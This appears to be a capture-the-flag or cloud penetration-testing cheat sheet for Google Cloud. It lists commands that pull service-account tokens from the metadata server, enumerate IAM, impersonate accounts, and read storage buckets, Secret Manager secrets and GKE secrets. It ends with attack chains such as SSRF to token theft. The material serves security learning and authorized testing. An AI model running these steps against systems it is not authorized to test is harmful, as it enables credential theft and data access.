# GCP

## Fingerprint

```text
metadata.google.internal
Metadata-Flavor: Google
*.googleapis.com
*.appspot.com
GOOGLE_APPLICATION_CREDENTIALS
GOOGLE_CLOUD_PROJECT
projects/PROJECT/zones/ZONE
ya29....
serviceaccount@PROJECT.iam.gserviceaccount.com
```

## Metadata

```bash
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json"
```

Useful paths:

```text
/project/project-id
/project/numeric-project-id
/instance/name
/instance/zone
/instance/attributes/
/instance/service-accounts/
/instance/service-accounts/default/email
/instance/service-accounts/default/scopes
/instance/service-accounts/default/token
```

Token:

```bash
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

Response:

```json
{
  "access_token": "ya29....",
  "expires_in": 3599,
  "token_type": "Bearer"
}
```

Without `Metadata-Flavor: Google`, the metadata server usually returns `403`.

## Auth

```bash
gcloud auth list
gcloud config list
gcloud config get-value project
gcloud projects list
gcloud auth activate-service-account --key-file key.json
gcloud auth print-access-token
gcloud auth print-identity-token
```

Service account key JSON:

```json
{
  "type": "service_account",
  "project_id": "...",
  "private_key_id": "...",
  "private_key": "-----BEGIN PRIVATE KEY-----...",
  "client_email": "...",
  "client_id": "...",
  "token_uri": "https://oauth2.googleapis.com/token"
}
```

## IAM

```bash
gcloud projects get-iam-policy PROJECT
gcloud iam service-accounts list
gcloud iam service-accounts keys list --iam-account SA_EMAIL
gcloud iam roles list --project PROJECT
gcloud iam policy-bindings list --project PROJECT
```

Look for:

```text
roles/owner
roles/editor
roles/iam.securityAdmin
roles/iam.serviceAccountTokenCreator
roles/iam.serviceAccountUser
roles/storage.admin
roles/secretmanager.admin
```

Impersonation:

```bash
gcloud auth print-access-token --impersonate-service-account SA_EMAIL
```

## Cloud Storage

```bash
gcloud storage ls
gcloud storage ls gs://BUCKET
gcloud storage ls gs://BUCKET --recursive
gcloud storage cp gs://BUCKET/key .
gcloud storage cp gs://BUCKET/key - 

gsutil ls gs://BUCKET
gsutil iam get gs://BUCKET
gsutil acl get gs://BUCKET
gsutil cp gs://BUCKET/key .
```

Anonymous:

```bash
gsutil ls gs://BUCKET
curl -s "https://storage.googleapis.com/storage/v1/b/BUCKET/o"
curl -s "https://storage.googleapis.com/BUCKET/key"
```

## Secret Manager

```bash
gcloud secrets list
gcloud secrets versions list SECRET
gcloud secrets versions access latest --secret=SECRET
gcloud secrets get-iam-policy SECRET
```

## KMS

```bash
gcloud kms keyrings list --location=global
gcloud kms keys list --keyring=KEYRING --location=global
gcloud kms decrypt --key=KEY --keyring=KEYRING --location=global \
  --ciphertext-file=ciphertext.bin --plaintext-file=plaintext.txt
```

## Compute

```bash
gcloud compute instances list
gcloud compute instances describe INSTANCE --zone=ZONE
gcloud compute instances get-serial-port-output INSTANCE --zone=ZONE
gcloud compute ssh INSTANCE --zone=ZONE
gcloud compute firewall-rules list
gcloud compute networks list
```

Startup scripts and metadata often contain secrets:

```bash
gcloud compute instances describe INSTANCE --zone=ZONE \
  --format='get(metadata.items)'
```

## GKE

```bash
gcloud container clusters list
gcloud container clusters get-credentials CLUSTER --zone=ZONE
kubectl get pods -A
kubectl get secrets -A
```

GKE Workload Identity maps a Kubernetes service account to a Google service account. From a pod, the metadata server may expose the mapped identity.

## Cloud Functions / Cloud Run

```bash
gcloud functions list
gcloud functions describe FUNCTION --region=REGION
gcloud functions call FUNCTION --data '{}'
gcloud run services list
gcloud run services describe SERVICE --region=REGION
gcloud run services proxy SERVICE --region=REGION
```

Environment variables, source archives, and service account bindings are the interesting parts.

## CTF Chains

```text
SSRF -> GCP metadata -> service account token -> GCS / Secret Manager
Leaked service account JSON -> gcloud auth -> project enumeration
Public GCS bucket -> object listing -> flag
GKE pod -> Workload Identity -> GCP token -> storage
Cloud Function env -> service account key -> escalation
```

## References

* [GCP metadata documentation](https://cloud.google.com/compute/docs/metadata/overview)
* [GCP IAM documentation](https://cloud.google.com/iam/docs/overview)
* [GCP Cloud Storage documentation](https://cloud.google.com/storage/docs)
* [HackTricks GCP](https://book.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html)
